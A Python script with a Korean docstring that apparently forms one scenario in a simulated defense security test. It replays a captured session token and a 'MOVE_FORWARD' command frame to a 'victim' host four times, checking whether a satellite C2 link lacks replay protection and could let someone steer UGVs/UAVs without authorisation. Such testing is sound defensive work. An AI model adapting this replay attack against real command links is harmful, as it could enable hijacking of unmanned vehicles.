"""
S3 - 위성통신(SATCOM) C2 재전송 공격
====================================
목표(방산 맥락): 암호화·재전송방지가 없는 위성 업링크에서 정상 명령을
캡처한 뒤 그대로 재전송(Replay)하여 UGV/UAV 를 무단 반복 조종한다.

기법:
  1) (모사) 스니핑으로 확보한 정상 세션 토큰으로 1회 정상 명령 전송
  2) 동일 프레임을 N회 재전송 → 재전송 방지가 없으면 매번 실행됨
"""
import sys
import json
import socket

CAPTURED_TOKEN = "SAT-SESS-9F2C"   # 링크 스니핑으로 확보했다고 가정

def send_tcp(host, port, line, timeout=3):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((host, port))
        s.sendall(line.encode())
        return s.recv(1024).decode(errors="replace")
    except Exception as e:
        return f"ERR:{e}"
    finally:
        s.close()

def run(host="victim", port=5600):
    result = {"scenario": "S3_satcom_replay", "target": f"{host}:{port}",
              "steps": []}
    frame = f"SATCMD|{CAPTURED_TOKEN}|MOVE_FORWARD"

    executed = 0
    for i in range(4):   # 1회 정상 + 3회 재전송
        resp = send_tcp(host, port, frame)
        replayed = i > 0
        ok = resp.startswith("ACK")
        if ok:
            executed += 1
        result["steps"].append(
            {"attempt": i + 1, "replay": replayed, "frame": frame, "resp": resp})

    # 재전송이 1회라도 실행되면 취약(replay 성공)
    result["success"] = executed >= 2
    result["impact"] = (f"재전송 {executed - 1}회 실행됨 → 명령 위조/반복 조종 가능"
                        if result["success"] else "재전송 차단됨")
    return result


if __name__ == "__main__":
    h = sys.argv[1] if len(sys.argv) > 1 else "victim"
    print(json.dumps(run(h), ensure_ascii=False, indent=2))
